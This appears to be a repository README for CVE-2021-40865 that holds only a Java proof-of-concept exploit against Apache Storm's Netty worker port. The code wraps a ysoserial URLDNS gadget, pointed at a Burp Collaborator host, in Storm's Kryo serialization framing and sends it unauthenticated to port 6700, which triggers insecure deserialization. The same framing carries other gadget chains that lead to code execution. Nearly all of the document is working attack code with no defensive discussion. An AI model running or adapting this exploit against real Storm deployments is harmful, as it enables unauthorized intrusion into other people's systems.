# CVE-2021-40865
CVE-2021-40865

## POC/exploit-poc
```java
import org.apache.commons.io.IOUtils;
import org.apache.storm.serialization.KryoValuesSerializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.URLDNS;

import java.io.*;
import java.math.BigInteger;
import java.net.*;
import java.util.HashMap;

public class NettyExploit {

    /**
     * Encoded as -600 ... short(2) len ... int(4) payload ... byte[]     *
     */
    public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
        byte[] payload = ser.serializeObject(obj);
        BigInteger codeInt = BigInteger.valueOf(-600);
        byte[] code = codeInt.toByteArray();
        BigInteger lengthInt = BigInteger.valueOf(payload.length);
        byte[] length = lengthInt.toByteArray();

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
        outputStream.write(code);
        outputStream.write(new byte[] {0, 0});
        outputStream.write(length);
        outputStream.write(payload);
        return outputStream.toByteArray( );
    }

    public static KryoValuesSerializer getSerializer() throws MalformedURLException {
        HashMap<String, Object> conf = new HashMap<>();
        conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
        conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
        conf.put("topology.skip.missing.kryo.registrations", false);
        conf.put("topology.fall.back.on.java.serialization", true);
        return new KryoValuesSerializer(conf);
    }

    public static void main(String[] args) {
        try {
            // Payload construction
            String command = "http://k6r17p7xvz8a7wj638bqj6dydpji77.burpcollaborator.net";
            ObjectPayload gadget = URLDNS.class.newInstance();
            Object payload = gadget.getObject(command);

            // Kryo serialization
            byte[] bytes = buffer(getSerializer(), payload);

            // Send bytes
            Socket socket = new Socket("127.0.0.1", 6700);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
